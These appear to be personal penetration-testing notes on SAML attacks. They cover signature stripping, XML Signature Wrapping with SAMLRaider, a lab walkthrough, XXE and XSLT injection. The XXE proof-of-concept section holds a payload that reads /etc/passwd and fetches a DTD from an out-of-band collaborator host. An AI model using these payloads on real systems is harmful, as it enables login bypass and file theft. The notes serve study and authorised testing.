#SAMLRaider #SAML #xml-signature #XML 
- For a primer on how SAML works, see [SAML Explained](SAML%20Explained.md)
##### Resources:
- [How to Hunt Bugs in SAML; a Methodology - Part II](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two)

---
## Generating an `X.509` cert to self-sign certificates
``` bash
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
```
- Import `cert.pem` into #SAMLRaider 
- Can **clone** the cert - only thing that differs are the **Modulus** and the **Signature**. 
- Or, can **modify fields** in a certificate & **Save & Self-Sign**
  ![](attachments/SAML%20Attacks.png)

---
### Simple attack:
Modify the `<NameID>` parameter in the `IDP`'s **`SAMLResponse`** to log in as a different user.
``` xml
<NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">admin@email.com</NameID>
```
*Will not work *

---

### Signature Stripping/Signature Exclusion
#xml-signature-exclusion #signature-stripping
When a **signature `<element>` is absent**, the **signature validation step** can sometimes get **skipped entirely.**

Can try:
- **Removing the entire `<ds:Signature>`** with `RemoveSignatures` button in `SAMLRaider` (for when the code checks the signature **only if the signature is provided**) ![](attachments/SAML%20Attacks-4.png)
- **Remove the contents of the `<ds:SignatureValue>`** ![](attachments/SAML%20Attacks-6.png)


---

## XML Signature Wrapping (`XSW`) 
#XSW

**TLDR:** XML documents containing XML signatures may be processed in two steps:
1. **Application checks the `<ds:Signature>`’s `<ds:Reference>`** element and uses the **`<ds:Reference>` URI** to **determine which XML element is signed.**
2. The **application's XML parser locates & loads** this XML element, using the top-down tree based navigation.
In `XSW`, the adversary:
- **Moves the signed `XML` element contents to a different location**
- **Replaces it** with an `XML` element **they control** & that doesn't invalidate the XML document
- Hopes the XML parser **finds the adversary-controlled element instead of the validated element.**

**Key components involved:**
- SAML Response & its ID (`<samlp:Response ... ID="_dfsvdf5..."`)
- `<ds:Signature ...>` & its `<ds:Reference URI="#_df55`
- The Subject of the Assertion (`</saml:Subject>`)
![](attachments/SAML%20Attacks-7.png)
### `XSW` Attacks

#### Attack #1 & #2: SAML Response Wrapping
**TLDR;** copies the **SAML Response** & **Assertion**, then inserts the original **Signature** as a child XML element of this **copied Response**. This way, the XML parser finds & uses the copied Response + attacker's ID after signature verification, instead of the original signed Response.
##### Attack #1: Enveloping Signature
**ORIGINAL:**
![](attachments/xsw-original.svg)
**Response copied + ID changed to attacker's, :**
![](attachments/xsw-1.svg)
##### Attack #2: Detached Signature:
![](attachments/xsw-2.svg)

#### Attack #3 & #4: Assertion Wrapping
**TLDR;** Copies the **Assertion** & adds it as a child element of the root **Response** element.
![](attachments/xsw-3.svg)
**Original Assertion** becomes a **child** of the **copied Assertion**:
![](attachments/xsw-4.svg)
*...for more attack wrapping types, [see the various attacks here](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/#xml-signature-wrapping-attack-1) - they are all options within `SAMLRaider` & worth trying during testing.* 

**At the base of it:** all attacks are trying to **insert an attacker-modified XML element** **within a signed SAML response** and **feed it to the XML parser** instead of the original validated element. 

---

### [Lab](https://pentesterlab.com/exercises/saml-vii): XSW #1 - Race to the `<Subject> <NameID>`!

Sometimes, the application uses the first `<NameID>` it can find in a `SAMLResponse` (inside the `<Subject>` element).
Leverage this to trick the SAML parser into authenticating you as the **first `<NameID>`** using the signature valid for the **second `<NameID>`**.
*Note: trying to wrap (hah) my head around how the XML is formatted and the exact nesting SUCKED, so for brevity: 

1. **Select `XSW1`** in SAMLRaider, and then **Apply XSW.**
2. Search for the **first email**, and **modify it to be the user you wish to log in as.***
![](attachments/XSW1.png)
*Replace top email (green) with account you want to log in as*

---

## XML External Entity via SAML
#xxe-via-saml 
As `SAML` are just **deflated & base 64 encoded `XML` documents**, can test for [`XXE`](https://portswigger.net/web-security/xxe) by **defining external entities** within the XML SAML response.
![](attachments/XXE-saml.png)

##### Simple XXE POC
Insert the following at the top of a `SAML` response, replacing the URL with your Burp Collaborator server.
``` xml
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY	file SYSTEM "file:///etc/passwd">
   <!ENTITY dtd SYSTEM "g7opmgof3ukzorfb14eh3r07hynpbgz5.oastify.com/text.dtd" >]>
```

---

### Extensible Stylesheet Language Transformation (XSLT)
#xlst #SAMLRaider 
`XSLT` is a language for transforming XML documents into other filetypes (`PDF`, `JSON`, `HTML`). 
Attack doesn't need a valid signature to succeed, as XSLT transformation occurs before signature verification. Meaning, this attack only requires **a SIGNED SAML response - can be self-signed or invalid!**
![](attachments/xslt.png)
**Example payload:** - replace `attackerUrl` with burp collaborator server. **Can do this with `SAMLRaider`**:
![](attachments/SAML%20Attacks-8.png)
*For other `XSLT` payloads, see:*
- https://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/
- https://vulncat.fortify.com/en/weakness?q=xslt

---

### Certificate Faking:



#### Workflow:
- To efficiently perform XSW attacks, **configure a proxy listener rule** to only catch responses containing a `SAMLResponse` parameter. 
  ***However, may lead to errors due to timeouts/invalid `SubjectConfirmation`, so is usually better to listen in-band!***![](attachments/SAML%20Attacks-1.png)
- Intercept & **save original `SAMLResponse` in the `Proxy`** for it to remain as a base for any attack.
- **Send any attacks to `Repeater`** to modify & send.


